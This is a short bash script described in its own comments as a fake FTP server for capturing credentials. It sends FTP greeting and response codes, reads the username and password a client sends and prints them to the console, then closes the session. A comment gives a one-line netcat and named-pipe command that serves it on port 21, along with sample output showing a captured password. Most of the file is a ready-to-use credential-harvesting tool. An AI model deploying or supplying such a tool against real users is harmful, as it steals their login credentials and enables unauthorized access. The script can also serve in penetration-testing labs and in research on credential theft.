#! /bin/bash

# A fake ftp server to get credentials on console line
# launch with netcat : 

# # rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|./fftp.sh |nc -lvp 21 >/tmp/f          
#   Listening on [0.0.0.0] (family 0, port 21)
#   Connection from [127.0.0.1] port 21 [tcp/ftp] accepted (family 2, sport 58300)
#   read USER user
#   read PASS s3cr3tp@ssw0rd
#   read SYST



echo "220 Welcome!"
read username
>&2 echo "read $username" 
echo "331 OK."
read password
>&2 echo "read $password" 
echo "230 OK."
read cmd
>&2 echo "read $cmd"
echo "500 Sorry."
echo "221 Goodbye."


